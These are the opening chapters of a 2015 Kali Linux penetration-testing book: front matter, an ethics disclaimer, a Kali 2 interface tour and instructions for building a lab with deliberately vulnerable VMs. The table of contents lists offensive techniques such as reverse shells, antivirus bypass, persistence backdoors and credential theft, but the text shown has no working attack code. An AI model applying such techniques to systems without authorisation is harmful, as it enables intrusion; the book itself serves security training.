![](Images/cover01161.jpeg)

![](Images/image00450.jpeg)

Intermediate Security Testing with Kali Linux 2

Cover layout by Daniel Dieterle

Cover Photo Design by Moriah Dieterle.

Copyright © 2015 by Daniel W. Dieterle. All rights reserved. No part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or by any means without the prior written permission of the publisher.

All trademarks, registered trademarks and logos are the property of their respective owners.

ISBN-13: 978-1516945863

Dedication

Thanks to my family for their unending support and prayer, you are truly a blessing!

Thanks to Bill Marcy, without your input, advice, common sense editing ability and encouragement this would have never happened.

Thanks to Richard Fairchild and all my Infosec family and friends for your constant support and sharing your time and knowledge with me. I truly appreciate each and every one of you.

Daniel W. Dieterle

“The art of war teaches us to rely not on the likelihood of the enemy's not coming, but on our own readiness to receive him; not on the chance of his not attacking, but rather on the fact that we have made our position unassailable.” - Sun Tzu

“Behold, I send you forth as sheep in the midst of wolves: be ye therefore wise as serpents, and harmless as doves.” - Matthew 10:16 (KJV)

About the Author

Daniel W. Dieterle has worked in the IT field for over 20 years. During this time he worked for a computer support company where he provided system and network support for hundreds of companies across Upstate New York and throughout Northern Pennsylvania.

He also worked in a Fortune 500 corporate data center, briefly worked at an Ivy League school’s computer support department and served as an executive at an electrical engineering company.

For about the last 6 years Daniel has been completely focused on security as a computer security researcher and author. His articles have been published in international security magazines, and referenced by both technical entities and the media.

Daniel has assisted with numerous security training classes and technical training books mainly based on Backtrack and Kali Linux.

Daniel W. Dieterle

![](Images/image00451.jpeg)

E-mail: cyberarms@live.com

Website: cyberarms.wordpress.com

Twitter: @cyberarms

Table of Contents

[Chapter 1](#part0000.xhtml__Toc430715053)

[What is Kali Linux?](#part0000.xhtml__Toc430715054)

[Why Use Kali Linux?](#part0000.xhtml__Toc430715055)

[Ethical Hacking Issues](#part0000.xhtml__Toc430715056)

[Scope of this Book](#part0000.xhtml__Toc430715057)

[Chapter 2](#part0000.xhtml__Toc430715058)

[Kali 2 Overview](#part0000.xhtml__Toc430715059)

[Applications Menu](#part0000.xhtml__Toc430715060)

[Command Line Tools](#part0000.xhtml__Toc430715061)

[Apache Webserver](#part0000.xhtml__Toc430715062)

[Installing](#part0000.xhtml__Toc430715063)

[Chapter 3](#part0000.xhtml__Toc430715064)

[Installing Virtual Machines](#part0000.xhtml__Toc430715065)

[Install VMware Player & Kali](#part0000.xhtml__Toc430715066)

[Setting the Kali IP address](#part0000.xhtml__Toc430715067)

[Installing VMware Tools for Linux](#part0000.xhtml__Toc430715068)

[Installing Metasploitable 2](#part0000.xhtml__Toc430715069)

[Windows 7 Virtual Machine](#part0000.xhtml__Toc430715070)

[Chapter 4](#part0000.xhtml__Toc430715071)

[Installing Mutillidae](#part0000.xhtml__Toc430715072)

[Mutillidae Database Configuration Changes](#part0000.xhtml__Toc430715073)

[Php.ini Configuration Change](#part0000.xhtml__Toc430715074)

[Windows 7 Mutillidae Install](#part0000.xhtml__Toc430715075)

[XAMPP install](#part0000.xhtml__Toc430715076)

[Security and Hints Level](#part0000.xhtml__Toc430715077)

[Metasploit](#part0000.xhtml__Toc430715078)

[Chapter 5](#part0000.xhtml__Toc430715079)

[New Meterpreter Commands](#part0000.xhtml__Toc430715080)

[New Features](#part0000.xhtml__Toc430715081)

[HANDS-ON New Features Section](#part0000.xhtml__Toc430715082)

[Bypass UAC Module](#part0000.xhtml__Toc430715083)

[Mimikatz Extensions](#part0000.xhtml__Toc430715084)

[Chapter 6](#part0000.xhtml__Toc430715085)

[Msfvenom](#part0000.xhtml__Toc430715086)

[Using Msfvenom](#part0000.xhtml__Toc430715087)

[A Simple Reverse Shell](#part0000.xhtml__Toc430715088)

[Remote Metasploit Shell](#part0000.xhtml__Toc430715089)

[Windows Shell with PowerShell](#part0000.xhtml__Toc430715090)

[Linux Python Meterpreter Shell](#part0000.xhtml__Toc430715091)

[Website Attack with PHP Shell](#part0000.xhtml__Toc430715092)

[Changing the Shellcode Filetype](#part0000.xhtml__Toc430715093)

[Generating Shells in Meterpreter](#part0000.xhtml__Toc430715094)

[Chapter 7](#part0000.xhtml__Toc430715095)

[Resource Files](#part0000.xhtml__Toc430715096)

[Making a Resource File](#part0000.xhtml__Toc430715097)

[Starting Resource Scripts from the Command Line](#part0000.xhtml__Toc430715098)

[Global Variables](#part0000.xhtml__Toc430715099)

[Pre-installed Resource Files & Ruby Integration](#part0000.xhtml__Toc430715100)

[Chapter 8](#part0000.xhtml__Toc430715101)

[Web Delivery](#part0000.xhtml__Toc430715102)

[Python Web Delivery vs. Linux](#part0000.xhtml__Toc430715103)

[Works on Mac too!](#part0000.xhtml__Toc430715104)

[PHP Web Delivery Just as Easy](#part0000.xhtml__Toc430715105)

[PHP Shell - A Closer Look](#part0000.xhtml__Toc430715106)

[Anti-Virus Bypass](#part0000.xhtml__Toc430715107)

[Chapter 9](#part0000.xhtml__Toc430715108)

[Bypassing Anti-Virus with Shellter](#part0000.xhtml__Toc430715109)

[Using Shellter](#part0000.xhtml__Toc430715110)

[Post Exploitation](#part0000.xhtml__Toc430715111)

[Chapter 10](#part0000.xhtml__Toc430715112)

[Post Modules & Railgun](#part0000.xhtml__Toc430715113)

[Post Modules](#part0000.xhtml__Toc430715114)

[Viewing & Using Post File](#part0000.xhtml__Toc430715115)

[Viewing the Recovered Loot](#part0000.xhtml__Toc430715116)

[IRB Railgun](#part0000.xhtml__Toc430715117)

[Chapter 11](#part0000.xhtml__Toc430715118)

[Metasploit & PowerShell for Post Exploitation](#part0000.xhtml__Toc430715119)

[PowerShell Basics](#part0000.xhtml__Toc430715120)

[Making Windows Talk to You](#part0000.xhtml__Toc430715121)

[Playing YouTube Videos](#part0000.xhtml__Toc430715122)

[Turning it into an Executable File](#part0000.xhtml__Toc430715123)

[Windows Gather User Credentials (phishing)](#part0000.xhtml__Toc430715124)

[Chapter 12](#part0000.xhtml__Toc430715125)

[PowerShell Payloads, PowerSploit and Nishang](#part0000.xhtml__Toc430715126)

[New PowerShell Payloads](#part0000.xhtml__Toc430715127)

[PowerShell Payload Modules Introduction](#part0000.xhtml__Toc430715128)

[Using PowerSploit Scripts](#part0000.xhtml__Toc430715129)

[Nishang - PowerShell for Penetration Testing](#part0000.xhtml__Toc430715130)

[PowerShell Payload as a Direct Exploit](#part0000.xhtml__Toc430715131)

[Chapter 13](#part0000.xhtml__Toc430715132)

[Maintaining Access](#part0000.xhtml__Toc430715133)

[Meterpreter “Persistence” Script](#part0000.xhtml__Toc430715134)

[S4u_persistence - Scheduled Persistence](#part0000.xhtml__Toc430715135)

[Vss_Persistence - Volume Shadow Copy Persistence](#part0000.xhtml__Toc430715136)

[Netcat Backdoor](#part0000.xhtml__Toc430715137)

[Enabling Remote Desktop](#part0000.xhtml__Toc430715138)

[Maintaining Access on a Webserver](#part0000.xhtml__Toc430715139)

[Scanning](#part0000.xhtml__Toc430715140)

[Chapter 14](#part0000.xhtml__Toc430715141)

[Nmap](#part0000.xhtml__Toc430715142)

[Basic Scans](#part0000.xhtml__Toc430715143)

[Scanning Specific Ports](#part0000.xhtml__Toc430715144)

[Using Nmap with Scripts](#part0000.xhtml__Toc430715145)

[OpenSSL-Heartbleed - Scanning and Exploiting](#part0000.xhtml__Toc430715146)

[IDS Evasion and Advanced Scans](#part0000.xhtml__Toc430715147)

[Chapter 15](#part0000.xhtml__Toc430715148)

[OWASP ZAP](#part0000.xhtml__Toc430715149)

[Quick Scan & Attack](#part0000.xhtml__Toc430715150)

[MitM Proxy Attack](#part0000.xhtml__Toc430715151)

[Fuzzing with ZAP](#part0000.xhtml__Toc430715152)

[Chapter 16](#part0000.xhtml__Toc430715153)

[Commercial Web App Scanners](#part0000.xhtml__Toc430715154)

[Nessus](#part0000.xhtml__Toc430715155)

[Basic Scan](#part0000.xhtml__Toc430715156)

[WebApp Pentesting](#part0000.xhtml__Toc430715157)

[Chapter 17](#part0000.xhtml__Toc430715158)

[Command Injection](#part0000.xhtml__Toc430715159)

[Remote Shell from Command Injection](#part0000.xhtml__Toc430715160)

[Chapter 18](#part0000.xhtml__Toc430715161)

[LFI and RFI](#part0000.xhtml__Toc430715162)

[Local File Inclusion (LFI)](#part0000.xhtml__Toc430715163)

[Remote File Inclusion (RFI)](#part0000.xhtml__Toc430715164)

[Remote File Inclusion to Shell](#part0000.xhtml__Toc430715165)

[Chapter 19](#part0000.xhtml__Toc430715166)

[Fimap](#part0000.xhtml__Toc430715167)

[Basic Scanning](#part0000.xhtml__Toc430715168)

[Exploiting via Remote Shell](#part0000.xhtml__Toc430715169)

[Exploit via Pentest Monkey’s Reverse Shell](#part0000.xhtml__Toc430715170)

[Mass Scanning](#part0000.xhtml__Toc430715171)

[Scanning with Google Dorks](#part0000.xhtml__Toc430715172)

[Chapter 20](#part0000.xhtml__Toc430715173)

[File Upload](#part0000.xhtml__Toc430715174)

[Remote Shell from File Upload](#part0000.xhtml__Toc430715175)

[Chapter 21](#part0000.xhtml__Toc430715176)

[Burp Suite](#part0000.xhtml__Toc430715177)

[The Interface](#part0000.xhtml__Toc430715178)

[Basic SQL Injection](#part0000.xhtml__Toc430715179)

[More Advanced Injection](#part0000.xhtml__Toc430715180)

[Remote Shell from SQL Injection](#part0000.xhtml__Toc430715181)

[Burp Encoder/ Decoder](#part0000.xhtml__Toc430715182)

[Automating Attacks with Burp Intruder and Compare](#part0000.xhtml__Toc430715183)

[Burp Comparer](#part0000.xhtml__Toc430715184)

[XSS (Cross Site Scripting Attacks) with Burp](#part0000.xhtml__Toc430715185)

[Persistent XSS with Burp](#part0000.xhtml__Toc430715186)

[Chapter 22](#part0000.xhtml__Toc430715187)

[SQL Map](#part0000.xhtml__Toc430715188)

[Overview of SQL Switches](#part0000.xhtml__Toc430715189)

[Blind Boolean Injection](#part0000.xhtml__Toc430715190)

[Testing Mutillidae with Sqlmap](#part0000.xhtml__Toc430715191)

[Running SQLmap](#part0000.xhtml__Toc430715192)

[Sqlmap Output Directory](#part0000.xhtml__Toc430715193)

[Chapter 23](#part0000.xhtml__Toc430715194)

[Cross-Site Scripting Framework (XSSF)](#part0000.xhtml__Toc430715195)

[Using XSSF](#part0000.xhtml__Toc430715196)

[Attacking Targets with XSSF](#part0000.xhtml__Toc430715197)

[Tunneling with XSSF](#part0000.xhtml__Toc430715198)

[Stored XSS and XSSF for the Win](#part0000.xhtml__Toc430715199)

[Chapter 24](#part0000.xhtml__Toc430715200)

[Web Shells](#part0000.xhtml__Toc430715201)

[Weevely](#part0000.xhtml__Toc430715202)

[Kali Included Webshells](#part0000.xhtml__Toc430715203)

[Chapter 25](#part0000.xhtml__Toc430715204)

[Web App Tools](#part0000.xhtml__Toc430715205)

[BBQSQL](#part0000.xhtml__Toc430715206)

[BlindElephant](#part0000.xhtml__Toc430715207)

[Dirb](#part0000.xhtml__Toc430715208)

[DirBuster](#part0000.xhtml__Toc430715209)

[HTTrack](#part0000.xhtml__Toc430715210)

[GoLismero](#part0000.xhtml__Toc430715211)

[Nikto](#part0000.xhtml__Toc430715212)

[Paros](#part0000.xhtml__Toc430715213)

[Plecost](#part0000.xhtml__Toc430715214)

[Skipfish](#part0000.xhtml__Toc430715215)

[SQLNinja](#part0000.xhtml__Toc430715216)

[SQLSUS](#part0000.xhtml__Toc430715217)

[Uniscan, Uniscan-gui](#part0000.xhtml__Toc430715218)

[Vega](#part0000.xhtml__Toc430715219)

[W3af](#part0000.xhtml__Toc430715220)

[WebScarab](#part0000.xhtml__Toc430715221)

[Webshag](#part0000.xhtml__Toc430715222)

[WebSlayer](#part0000.xhtml__Toc430715223)

[WebSploit](#part0000.xhtml__Toc430715224)

[WhatWeb](#part0000.xhtml__Toc430715225)

[WPScan](#part0000.xhtml__Toc430715226)

[XSSer](#part0000.xhtml__Toc430715227)

[The PenTesters Framework](#part0000.xhtml__Toc430715228)

[Attacking Smart Devices](#part0000.xhtml__Toc430715229)

[Chapter 26](#part0000.xhtml__Toc430715230)

[Installing Android SDK & Creating a Virtual Phone](#part0000.xhtml__Toc430715231)

[Installing the Android SDK](#part0000.xhtml__Toc430715232)

[Using the Management Console](#part0000.xhtml__Toc430715233)

[Installing different android versions](#part0000.xhtml__Toc430715234)

[Using your own Smart Phone in Kali](#part0000.xhtml__Toc430715235)

[Enabling USB Debug Mode](#part0000.xhtml__Toc430715236)

[Troubleshooting Connectivity](#part0000.xhtml__Toc430715237)

[Communicating with the Device](#part0000.xhtml__Toc430715238)

[Connecting to an Emulated Android Device with ADB](#part0000.xhtml__Toc430715239)

[Installing an App using ADB](#part0000.xhtml__Toc430715240)

[Chapter 27](#part0000.xhtml__Toc430715241)

[Rooting and ADB Usage](#part0000.xhtml__Toc430715242)

[What is Rooting?](#part0000.xhtml__Toc430715243)

[Viewing Protected Databases](#part0000.xhtml__Toc430715244)

[The Browser Database - Surfing History and Passwords](#part0000.xhtml__Toc430715245)

[System Directory](#part0000.xhtml__Toc430715246)

[Chapter 28](#part0000.xhtml__Toc430715247)

[Security Testing Android Devices](#part0000.xhtml__Toc430715248)

[Getting a Remote Shell on Android using Metasploit](#part0000.xhtml__Toc430715249)

[Creating a booby trapped APK file](#part0000.xhtml__Toc430715250)

[Webcam Commands](#part0000.xhtml__Toc430715251)

[Android Meterpreter Commands](#part0000.xhtml__Toc430715252)

[Android Webview Exploit Tutorial](#part0000.xhtml__Toc430715253)

[Chapter 29](#part0000.xhtml__Toc430715254)

[Man in the Middle & Wi-Fi Attacks against Android](#part0000.xhtml__Toc430715255)

[Man-in-the-Middle with ARPspoof](#part0000.xhtml__Toc430715256)

[TCP Dump and Wireshark](#part0000.xhtml__Toc430715257)

[Rouge Wi-Fi Router Attacks with Mana](#part0000.xhtml__Toc430715258)

[Forensics](#part0000.xhtml__Toc430715259)

[Chapter 30](#part0000.xhtml__Toc430715260)

[Forensics Introduction](#part0000.xhtml__Toc430715261)

[Forensic Tools](#part0000.xhtml__Toc430715262)

[Analyzing Memory using Volatility](#part0000.xhtml__Toc430715263)

[Obtaining a Memory Dump](#part0000.xhtml__Toc430715264)

[Analyzing a Memory Image with Volatility](#part0000.xhtml__Toc430715265)

[Analyzing Registry Keys](#part0000.xhtml__Toc430715266)

[Viewing Network Connections with Netscan (and Connscan)](#part0000.xhtml__Toc430715267)

[Recovering Data from Process Memory](#part0000.xhtml__Toc430715268)

[Recovering Password Hashes](#part0000.xhtml__Toc430715269)

[Volatility Plugins](#part0000.xhtml__Toc430715270)

[Basic Malware Analysis with Malfind](#part0000.xhtml__Toc430715271)

[Chapter 31](#part0000.xhtml__Toc430715272)

[Pulling Word Document from Remote System](#part0000.xhtml__Toc430715273)

[Recovering Data from Word](#part0000.xhtml__Toc430715274)

[Pulling Data from Outlook](#part0000.xhtml__Toc430715275)

[Recovering Facebook Conversations](#part0000.xhtml__Toc430715276)

[Pulling passwords using Procdump & Mimikatz](#part0000.xhtml__Toc430715277)

[Pulling Memory Dumps with PowerShell](#part0000.xhtml__Toc430715278)

[Chapter 32](#part0000.xhtml__Toc430715279)

[Digital Forensics Framework](#part0000.xhtml__Toc430715280)

[Creating a Hard Drive Image](#part0000.xhtml__Toc430715281)

[Analyzing a Test Image](#part0000.xhtml__Toc430715282)

[Chapter 33](#part0000.xhtml__Toc430715283)

[Forensics Commands](#part0000.xhtml__Toc430715284)

[Autopsy](#part0000.xhtml__Toc430715285)

[Dumpzilla](#part0000.xhtml__Toc430715286)

[Extundelete](#part0000.xhtml__Toc430715287)

[Foremost](#part0000.xhtml__Toc430715288)

[Galleta](#part0000.xhtml__Toc430715289)

[iPhone Backup Analyzer](#part0000.xhtml__Toc430715290)

[Internet of Things](#part0000.xhtml__Toc430715291)

[Chapter 34](#part0000.xhtml__Toc430715292)

[The Internet of Things](#part0000.xhtml__Toc430715293)

[Basic Security Test](#part0000.xhtml__Toc430715294)

[Mass Exploiting the IoT Device](#part0000.xhtml__Toc430715295)

[Defending](#part0000.xhtml__Toc430715296)

[Chapter 35](#part0000.xhtml__Toc430715297)

[Network Defense and Conclusion](#part0000.xhtml__Toc430715298)

## Chapter 1

## What is Kali Linux?

Kali 2 is the latest and greatest version of the ever popular Backtrack/ Kali Linux penetration testing distribution. Kali has been re-vamped from the ground up to be the best and most feature rich Ethical Hacking/ Pentesting distribution available. Kali 2 also runs on more hardware devices greatly increasing your options for computer security penetration testing or “pentesting” systems.

If you are coming to Kali from a Backtrack background, after a short familiarization period you should find that everything is very similar and your comfort level should grow very quickly. If you are new to Kali 2, once you get used to it, you will find an easy to use security testing platform that includes hundreds of useful and powerful tools to test and help secure your network systems. 

Why Use Kali Linux?

Kali includes over 400 security testing tools. A lot of the redundant tools from Backtrack have been removed and the tool interface streamlined. You can now get to the most used tools quickly as they appear in a top ten security tool menu. You can also find these same tools and a plethora of others all neatly categorized in the menu system. 

Kali allows you to use similar tools and techniques that a hacker would use to test the security of your network so you can find and correct these issues before a real hacker finds them. Hackers usually perform a combination of steps when attacking a network. These steps are summarized below:

 Recon – Checking out the target using multiple sources – like intelligence gathering.

 Scanning – Mapping out and investigating your network.

 Exploitation – Attacking holes found during the scanning process.

 Elevation of Privileges – Elevating a lower access account to Root, or System Level.

 Maintaining Access – Using techniques like backdoors to keep access to your network.

 Covering their Tracks – Erasing logs, and manipulating files to hide the intrusion.

An Ethical Hacker or Penetration Tester (good guys hired to find the holes before an attacker does) mimics many of these techniques, using parameters and guidelines set up with corporate management, to find security issues. They then report their findings to management and assist in correcting the issues.

We will not be covering every step in the process, but will show you many of the techniques that are used, and how to defend against them.

I would think the biggest drive to use Kali over commercial security solutions is the price. Security testing tools can be extremely costly, Kali is free! Secondly, Kali includes open source versions of numerous commercial security products, so you could conceivably replace costly programs by simply using Kali. All though Kali does includes several free versions of popular software programs that can be upgraded to the full featured paid versions and used directly through Kali. And if you enjoy Kali, the Professional version offers even more features and ease of use.

There really are no major tool usage differences between Backtrack, Kali and the new Kali 2\. But it has been completely retooled from the ground up, making software updates and additions much easier. In Kali, you update everything using the Kali update command which makes system integrity much better. Simply update Kali and it will pull down the latest versions of the included tools for you. Just a note of caution, updating tools individually could break Kali, so running the Kali update is always the best way to get the latest packages for the OS.

Though Kali can’t possibly contain all the possible security tools that every individual would prefer, it contains enough that Kali could be used from beginning to end. Don’t forget that Kali is not just a security tool, but a full-fledged Linux Operating System. So if your favorite tool runs under Linux, but is not included, most likely you can install and run it in Kali.

Ethical Hacking Issues

In Ethical Hacking a security tester basically acts like a hacker. He uses tools and techniques that a hacker would most likely use to test a target network’s security. The difference is, the penetration tester is hired by the company to test its security and when done reveals to the leadership team how they got in and what they can do to plug the holes.

The biggest issue in using these techniques is ethics and law. Some security testing techniques that you can perform with Kali and its included tools are actually illegal to do in some areas. So it is important that users check their local, State and Federal laws before using Kali.

Also, you may have some users that try to use Kali, a very powerful set of tools, on a network that they do not have permission to do so. Or they will try to use a technique they learned but may have not mastered on a production network. All of these are potential legal and ethical issues.

Scope of this Book

This book focuses on those with beginning to intermediate experience with Backtrack/ Kali. The reader should be somewhat familiar with using the platform and already have some basic experience in computer security testing with industry standard tools.

This book basically continues where my first book “Basic Security Testing with Kali Linux” ended. We will cover everything from a basic overview of the new Kali 2 to using the included tools to test security on Windows and Linux based systems.

We will cover:

 Using Metasploit

 Post Exploitation Techniques

 Creating and using Webshells

 Web Application Security Testing

 Testing Android Security

 Computer Forensics from a Security Point of View

 Defending your Systems

I have received numerous requests to add more coverage of tools in this book so I have included two chapters devoted solely to individual tools. In actuality, throughout this book I am for the most part just showing you how to use the standard tools in Kali. I am not showing you how to do everything. But self-mastery comes when you start to ask, “What If?”

How did that work?  Wait a minute; we generated some sort of PHP shell. Websites can host PHP files, what if we were able to copy that file up to a webserver, we should be able to get a remote shell that way too right?

This is the thought process that will move you along from just following a step-by-step tutorial to true mastery of the material.

Why did I write this book?

This book is a continuation of my first book,“Basic Security Testing with Kali Linux”. I have written technical articles on Backtrack/ Kali Linux for several years now, and have helped out with multiple Backtrack/ Kali books and training series. I get a lot of questions on how to use the platform, so I decided that it was time to write my own series of Kali training books. My other reason for writing this book is to help get young people interested in the field of computer security. Our country is currently facing a lack of available IT security professionals for the Law Enforcement and Military fields.

When Things Go Bad

The creators of Kali Linux have done an amazing job at pulling together hundreds of security tools into one Linux distribution. As such it is nearly impossible to guarantee that every tool works 100%, especially after a system update or if a tool is installed that did not come in the distribution. If a tool is not working, check the developer’s websites and forums to see if there are any reported problems, as others may be having the same issue. Known issues are usually fixed pretty quickly.

Install and update procedures for tools will change over time, if the install/setup information presented in this book no longer works, please check the tool creator’s website for the latest information. 

Lastly, always keep a backup copy of your Kali Virtual Machine in case installing an un-supported tool breaks Kali or if you just want to start over with a clean slate. The easiest way to do this is to simply make a copy of the downloaded VM and name it Kali Backup. Then if your Kali is changed in a way that you don’t like, or becomes unstable, you can always use a copy of your backup.

Disclaimer

The information in this book is for educational purposes only. Never try to gain access to or security test a network or computer that you do not have written permission to do so. Doing so could leave you facing legal prosecution and you could end up in jail.

There are many issues and technologies that you would run into in a live environment that are not covered. This book only demonstrates some of the most basic tool usage in Kali and should not be considered as an all-inclusive manual to Ethical hacking or pentesting.

I did not create any of the tools in Kali nor am I a representative of Kali Linux or Offensive Security. Any errors, mistakes, or tutorial goofs in this book are solely mine and should not reflect on the tool creators. Please let me know where I screwed up so it can be corrected.

Though not mentioned by name, thank you to the Kali developers for creating a spectacular product and thanks to the individual tool creators, you are all doing an amazing job and are helping secure systems worldwide!

## Chapter 2

## Kali 2 Overview

After ten years of evolution, Offensive Security brings us Kali 2! Kali 2 is by far the easiest to use of all the Backtrack/ Kali releases. The menus have been completely re-organized and streamlined and many of the tools are represented by helpful icons. Let’s take a look a few minutes and look at some of the new features of Kali 2.

![](Images/image00452.jpeg)

What’s new in Kali 2?

 New user interface

 New Menus and Categories

 Native Ruby 2.0 for faster Metasploit loading

 Desktop notifications

 Built in Screencasting

Kali 2 is much more streamlined and the layout flows very well compared to earlier versions of Kali/ Backtrack. It just feels like everything is at your fingertips and laid out in a very clear and concise manner.

Desktop Overview

The new Desktop looks very good and places everything at your fingertips:

![](Images/image00453.jpeg)

Favorites Bar

The new Kali comes with a customizable “Favorites bar” on the left side of the desktop. This menu lists the most commonly used applications to get you into the action quicker:

![](Images/image00454.jpeg)

Just click on one and the represented tool is automatically started with the required dependencies. For example, clicking on the Metasploit button pre-starts the database software and checks to make sure the default database has been created before launching Metasploit. 

Clicking on the “Show Applications” button on the bottom of the favorites bar reveals a lot more applications. The programs are arranged in folders by type:

![](Images/image00455.jpeg)

If you don’t see the app you want, just type in what you are looking for in the search bar.

Applications Menu

A list of common program favorites listed by categories is located under the Applications menu:

![](Images/image00456.jpeg)

The tools are laid out logically by type. For example, just click on the Web Application Analysis menu item to see the most common web app testing tools:

![](Images/image00457.jpeg)

Notice that I didn’t say “all” of the tools for a specific category would be listed. This is because the menu system only shows the top tools and not all of the tools available in Kali. In reality only a fraction of the installed tools in Kali are actually in the menu system. Most of the tools are accessible only from the command line.

Command Line Tools

The majority of tools are installed in the “/usr/share directory”:

![](Images/image00458.jpeg)

These tools (as well as tools listed in the menu) are run simply by typing their name in a terminal. Take a few moments and familiarize yourself with both the menu system and the share directory.

Auto-minimizing windows

Another thing that is new in Kali 2 is that some windows tend to auto-minimize and seem to dis-appear at times. When a window is minimized you will see a white circle to the left of the associated icon on the favorite bar. In the screenshot below, it is showing that I have two terminal windows minimized:

![](Images/image00459.jpeg)

If I click on the terminal icon once the first terminal window will appear, click twice and both minimized terminal windows re-appear:

![](Images/image00460.jpeg)

You can also hit “Alt-Tab” to show minimized windows. Keep the “Alt” key pressed and arrow around to see additional windows.

Workspaces

As in the earlier versions of Kali/ Backtrack you also have workspaces. If you are not familiar with workspaces, they are basically additional desktop screens that you can use. Hitting the “Super Key” (Windows Key) gives you an overview of all windows that you have open. If you have a touch screen monitor you can also grab and pull the workspaces menu open. With workspaces you are able to drag and drop running programs between the workspaces:

![](Images/image00461.jpeg)

Places Menu

The Places menu contains links to different locations in Kali:

![](Images/image00462.jpeg)

Screencasting

Kali 2 also has the capability to do screen casting built in. With this you can record your security testing adventures as they happen!

![](Images/image00463.jpeg)

Apache Webserver

At the time of this writing, the Service Icons to stop, start and restart Apache Web Server seem to have been removed from Kali 2\. Not a problem as you can start them from a terminal prompt by using the following commands:

 To Start - “service apache2 start” or  “/etc/init.d/apache2 start”

 To Stop - “service apache2 stop” or  “/etc/init.d/apache2 stop”

 To Restart - “service apache2 restart” or “/etc/init.d/apache2 restart”

As seen below:

![](Images/image00464.jpeg)

You can now surf to Kali’s webserver, notice the default webpage has changed from Kali 1:

![](Images/image00465.jpeg)

The root website is also one level deeper now located in a folder called HTTP:

![](Images/image00466.jpeg)

So when you use the Apache server, just drop your website pages/folders into the “/var/www/html/” directory instead of the old “/var/www/” directory.

Upgrading

Keeping your Kali install up to date is very important. Enter the following commands to update Kali:

 apt-get update

 apt-get dist-upgrade

 reboot

Where to go from here?

Check out Offensive Security’s Top-10 post install tips:

 [https://www.offensive-security.com/kali-linux/top-10-post-install-tips/](https://www.offensive-security.com/kali-linux/top-10-post-install-tips/)

Conclusion

In this chapter we quickly covered Kali 2’s new features and changes. The menu changes in Kali 2 make finding and using security tools much easier than in previous versions. If you are not familiar with Kali, the best way to learn is to spend time looking around and using the system. I think you will really enjoy it!

# Installing

## Chapter 3

## Installing Virtual Machines

In this section we will setup Kali 2, Windows 7 and Metasploitable 2 as Virtual Machines (VMs) using VMware Player on a host computer. Setting up our testing lab using virtual machines makes it very easy to learn offensive computer security testing using Kali. Virtual machines make it possible to run several operating systems on a single computer. That way we do not need a room full of computers to set up a lab environment. We only need one machine powerful enough to run several Virtual Machine sessions at once.

For the book I used a 64 bit Windows 10 Core I-5 system with 8 GB of RAM as a host. It had plenty of power to run all three of our lab operating systems at the same time with no problem at all. Though 64 bit versions of the virtual machines should work similar, I used the 32 bit Versions of Kali Linux and Windows 7. Some Kali tools will only run in a 32 bit environment. If you are using Windows as your Host system, I recommend using Windows 7 instead of 10\. I did run into some issues with using Windows 10 as a host.

Though I cover using VMware Player as the host software, you can use any Virtual Machine software that you want if you are more familiar with them. When the lab is complete, you should have a small test network that looks something like this:

![](Images/image00467.jpeg)

Because we will be dealing with vulnerable operating systems, make sure that you have a Firewall Router (Preferably hardware) between the Host system and the live internet. The IP addresses listed are the ones that I used throughout the book. I will show you how to set the IP addresses using Static settings. If you are comfortable, you can leave the IP addresses as the default“Dynamic” and use the above chart as an address reference guide.

### Install VMware Player & Kali

Installing Kali on VMware is extremely simple as Offensive Security provides a Kali 2 VMware image that you can download, so we will not spend a lot of time on this.

1. Download and install VMware Player

([https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_player/7_0](https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_player/7_0))

![](Images/image00468.jpeg)

2. Agree to the license agreement and choose where you want it to install it, the default is normally fine.

3. Click, “Finish” when done.

4. Download the 32 bit Kali 2 VM PAE Image (https://www.offensive-security.com/kali-linux-vmware-arm-image-download/) and save it in a location where you want it to run from.

(**Note: It is always a good idea to verify the SHA1SUM with the downloaded image to verify you have a legitimate copy of the image. There are numerous MD5/ SHA1 freeware programs available.)

5. Unzip the file

6. Start the VMware Player.

7. Click, “Player” from the menu.

8. Then “File”

9. Next click, “Open”.

10.  Surf to the extracted Kali .vmx file, select it, and click, “Open”.

11.  It will now show up on the VMWare Player home screen

12.  With the Kali VM highlighted click, “Edit Virtual Machine Settings”.

13.  Here you can view and change any settings for the VM:

![](Images/image00469.jpeg)

14.  Click, “Network Adapter”:

It is set to NAT by default. NAT means that each Virtual machine will be created in a small NAT network shared amongst them and with the host; they can also reach out to the internet if needed. Some people have reported problems using NAT and can only use Bridged, thus I used bridged for all of my virtual machines in this book. If you do use bridged, make sure to have a hardware firewall between your system and the internet.

15.  Click “OK” to return to the VMWare Player main screen.

16.  Now just click, “Play Virtual Machine”, to start Kali. You may get a message asking if the VM was moved or copied, just click, “I copied it”.

17.  When prompted to install VMWare tools, select to install them later.

18.  When Kali boots up, you will come to the Login Screen:

![](Images/image00470.jpeg)

19.  Login with the username, “root” and the password “toor” (root backwards).

20.  You will then be presented with the main Desktop:

![](Images/image00471.jpeg)

### Setting the Kali IP address

Now we need to set the IP address for Kali.

 Open a Terminal Prompt (Use the “Terminal” button on the favorite bar or from the “Applications” menu)

 cd /etc/network

 nano interfaces

![](Images/image00472.jpeg)

Change the eth0 section to:

 auto eth0

 iface eth0 inet static

 address 192.168.1.39

 netmask 255.255.255.0

 gateway 192.168.1.1

![](Images/image00473.jpeg)

 “Cntrl-X” to exit and “y” to save

And then save and reboot. Run “ifconfig” to make sure the IP address was successfully changed:

![](Images/image00474.jpeg)

That’s it; Kali should now be installed and ready to go.

### Installing VMware Tools for Linux

When Kali boots up, a VMware pop-up should appear asking if you want to install the VMware tools into the operating system VM. This allows the OS to work better with VMware, usually giving you more control over video options and enables cut and paste capability with the host. You don’t need to install them, but it usually makes things work a little bit smoother. And more importantly allows you to drag and drop files between the virtual machines which does come in handy. To install, when prompted click “Download and Install” and then allow the tools to install and then click, “Close” when finished.

### Installing Metasploitable 2

Metasploitable 2, the purposefully vulnerable Linux operating system that we will practice exploiting, is also available as a Virtual Ware VM. As we did with the Kali VM above, all we need to do is download the Metasploitable 2 VM image, unzip it and open it with VMware Player.

1.  Download Metasploitable 2 ([http://sourceforge.net/projects/metasploitable/files/Metasploitable2/](http://sourceforge.net/projects/metasploitable/files/Metasploitable2/)) and place it in a folder where you want it saved.
2.  Unzip the File.
3.  Then just open Metasploitable 2 in VMWare by starting VMWare Player, click, “Player”, “File”, “Open”, then surf to and select the Metasploitable.vmx file and click, “Open”.
4.  It will now show up in the VMware Player Menu.
